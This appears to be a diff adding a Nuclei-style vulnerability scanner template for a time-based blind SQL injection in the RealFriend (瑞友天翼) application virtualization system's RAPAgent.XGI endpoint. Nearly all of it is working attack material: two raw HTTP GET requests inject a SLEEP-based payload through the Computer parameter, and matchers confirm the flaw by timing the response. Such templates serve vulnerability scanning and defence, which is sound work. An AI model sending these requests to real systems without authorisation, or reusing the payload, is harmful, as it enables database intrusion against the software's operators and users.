@@ -1,0 +1,52 @@
+id: poc-yaml-gwt-system-rapapagent-xgi-sqli
+info:
+  name: 瑞友天翼应用虚拟化系统 RAPAgent.XGI SQL Injection
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection
+  description: |
+    This template identifies a SQL Injection vulnerability in 瑞友天翼应用虚拟化系统 RAPAgent.XGI.
+
+variables:
+  t1: '{{rand_int(5,9)}}'
+  t2: '{{to_number(t1) + 2}}'
+  t3: '{{rand_int(1,4)}}'
+  t4: '{{to_number(t3) + 2}}'
+
+http:
+  - raw:
+      - |
+        GET /RAPAgent.XGI?CMD=GETApplication&AppID=APP00000003&AppID=APP00000001&Language=ZH-CN&Language=ZH-CN&User=admin&User=admin&PWD=&PWD=&AuthType=0&AuthType=0&Computer=CMD=GETApplication&Computer=WIN-1TLJMBOFIT6%27%20AND%20(SELECT%209990%20FROM%20(SELECT(SLEEP({{t1}})))Joqo)%20AND%20%27DseX%27=%27DseX&Finger=&Finger=&IP&IP HTTP/1.1
+        Host: {{Hostname}}
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: dsl
+        dsl:
+          - 'duration >= to_number(t1)'
+          - 'duration <= to_number(t2)'
+      - type: word
+        part: body
+        words:
+          - "[result]"
+          - "MsgID"
+  - raw:
+      - |
+        GET /RAPAgent.XGI?CMD=GETApplication&AppID=APP00000003&AppID=APP00000001&Language=ZH-CN&Language=ZH-CN&User=admin&User=admin&PWD=&PWD=&AuthType=0&AuthType=0&Computer=CMD=GETApplication&Computer=WIN-1TLJMBOFIT6%27%20AND%20(SELECT%209990%20FROM%20(SELECT(SLEEP({{t3}})))Joqo)%20AND%20%27DseX%27=%27DseX&Finger=&Finger=&IP&IP HTTP/1.1
+        Host: {{Hostname}}
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: dsl
+        dsl:
+          - 'duration >= to_number(t3)'
+          - 'duration <= to_number(t4)'
+      - type: word
+        part: body
+        words:
+          - "[result]"
+          - "MsgID"
